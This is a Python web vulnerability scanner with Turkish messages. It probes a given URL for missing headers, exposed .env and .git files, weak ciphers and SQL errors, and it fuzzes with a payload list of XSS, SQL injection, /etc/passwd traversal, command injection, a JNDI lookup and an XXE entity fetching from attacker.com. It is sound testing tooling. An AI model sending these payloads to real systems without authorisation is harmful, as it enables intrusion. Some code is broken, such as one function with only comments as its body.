import requests
import ssl
import re
import subprocess
from urllib.parse import urlparse
import logging

# Logging ayarları
logging.basicConfig(filename='security_tests.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SECURE_HEADERS = [
    'Strict-Transport-Security',
    'Content-Security-Policy',
    'X-Content-Type-Options',
    'X-Frame-Options',
    'X-XSS-Protection'
]

SENSITIVE_KEYWORDS = [
    'password', 'credit card', 'ssn', 'social security', 'token',
    'api_key', 'secret', 'key', 'credential', 'bank account', 'iban', 'pin'
]

DB_ERROR_PATTERNS = [
    "sql syntax", "sql error", "database error", "mysql", "psql",
    "oracle", "mssql", "syntax error", "query failed"
]

DANGEROUS_PATTERNS = [
    "%0d%0a", "\r\n", "\n", "%0a", "%23", "%3f"
]

# Fuzzing payload'ları
ADVANCED_FUZZING_PAYLOADS = [
    "<script>alert(1)</script>", "' OR '1'='1", "../../../../etc/passwd", "${7*7}",
    "' OR SLEEP(10)--", "<img src=x onerror=alert(1)>", "{${lower:jndi:ldap://127.0.0.1/a}}",
    "; ls -la", "`cat /etc/passwd`", "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/malicious.dtd\"> %remote;]>"
]

# Hassas dosya taraması
COMMON_SENSITIVE_FILES = [
    "robots.txt", ".git", ".env", "backup.sql", "config.php"
]

def check_vulnerability_management(url):
    logging.info("Zafiyet Yönetim Sistemi ile entegrasyon gerçekleştirilecek...")
    # Zafiyet yönetim sistemi entegrasyonu yapılabilir.
    # Bu kısım için ilgili API'ler kullanılarak raporlama yapılabilir.

def perform_advanced_fuzzing(url):
    for payload in ADVANCED_FUZZING_PAYLOADS:
        fuzzed_url = url + "?" + payload
        try:
            response = requests.get(fuzzed_url)
            logging.info(f"Gelişmiş Fuzzing denemesi: {fuzzed_url} -> {response.status_code}")
            check_sensitive_data(response)
        except requests.RequestException as e:
            logging.error(f"Fuzzing isteği sırasında hata oluştu: {e}")

def check_sensitive_files(url):
    for sensitive_file in COMMON_SENSITIVE_FILES:
        sensitive_url = f"{url.rstrip('/')}/{sensitive_file}"
        try:
            response = requests.get(sensitive_url)
            if response.status_code == 200:
                logging.warning(f"Dikkat: {sensitive_file} dosyası sunucuda bulundu: {sensitive_url}")
            else:
                logging.info(f"{sensitive_file} dosyası sunucuda bulunamadı.")
        except requests.RequestException as e:
            logging.error(f"Dosya taraması sırasında hata oluştu: {e}")

def check_cipher_suite_downgrade(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    try:
        result = subprocess.run(["openssl", "s_client", "-connect", f"{hostname}:443", "-cipher", "ALL"],
                                capture_output=True, text=True)
        if "Cipher" in result.stdout:
            logging.info("SSL şifreleme algoritmaları kontrol edildi.")
            if "LOW" in result.stdout or "EXPORT" in result.stdout:
                logging.warning(f"Dikkat: {hostname} üzerinde zayıf bir şifreleme algoritması kullanılıyor!")
        else:
            logging.error("SSL şifreleme algoritmaları kontrol edilemedi.")
    except Exception as e:
        logging.error(f"SSL şifreleme kontrolünde hata oluştu: {e}")

def check_ssl_certificate(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    context = ssl.create_default_context()
    try:
        with context.wrap_socket(ssl.SSLSocket(), server_hostname=hostname) as s:
            s.connect((hostname, 443))
            cert = s.getpeercert()
            logging.info("SSL sertifikası geçerli.")
            return True
    except ssl.SSLError as e:
        logging.error(f"SSL sertifikası hatası: {e}")
        return False

def check_security_headers(headers):
    missing_headers = []
    for header in SECURE_HEADERS:
        if header not in headers:
            missing_headers.append(header)
    if missing_headers:
        logging.warning(f"Dikkat: Eksik güvenlik başlıkları bulundu: {', '.join(missing_headers)}")
    else:
        logging.info("Tüm gerekli güvenlik başlıkları mevcut.")

def check_sensitive_data(response):
    for keyword in SENSITIVE_KEYWORDS:
        if keyword in response.text.lower():
            logging.warning(f"Dikkat: Yanıtta '{keyword}' kelimesi bulundu. Hassas veri sızıntısı olabilir.")

def check_sql_errors(response):
    for pattern in DB_ERROR_PATTERNS:
        if re.search(pattern, response.text, re.IGNORECASE):
            logging.warning(f"Dikkat: Yanıtta '{pattern}' hata deseni bulundu. SQL Enjeksiyonuna duyarlı olabilir.")

def check_response_splitting(response):
    for pattern in DANGEROUS_PATTERNS:
        if pattern in response.text:
            logging.warning(f"Dikkat: Yanıtta '{pattern}' tehlikeli desen bulundu. HTTP Yanıt Ayırma veya Header Injection olabilir.")

def manipulate_http_headers(url):
    headers = {
        'X-Forwarded-For': '127.0.0.1',
        'X-Original-URL': urlparse(url).path
    }
    try:
        response = requests.get(url, headers=headers)
        logging.info(f"Manipüle edilmiş HTTP başlıklarıyla yapılan istek sonucu: {response.status_code}")
        check_sensitive_data(response)
    except requests.RequestException as e:
        logging.error(f"HTTP başlıkları manipülasyonu sırasında hata oluştu: {e}")

def check_sensitive_data_exposure(url):
    try:
        if url.startswith('https://'):
            check_ssl_certificate(url)
            check_cipher_suite_downgrade(url)
        else:
            logging.warning("Uyarı: HTTPS kullanılmıyor. Veri aktarımı güvenli olmayabilir.")
        
        try:
            response = requests.get(url)
            logging.info(f"URL kontrolü başarılı: {url}")
            check_sensitive_data(response)
            check_sql_errors(response)
            check_response_splitting(response)
            manipulate_http_headers(url)
            check_sensitive_files(url)
            perform_advanced_fuzzing(url)
            check_security_headers(response.headers)
            check_vulnerability_management(url)
        except requests.RequestException as e:
            logging.error(f"URL'e bağlanırken hata oluştu: {e}")

    except Exception as e:
        logging.error(f"Genel test hatası: {e}")

if __name__ == "__main__":
    url = input("Lütfen test edilecek URL'i girin: ")
    check_sensitive_data_exposure(url)
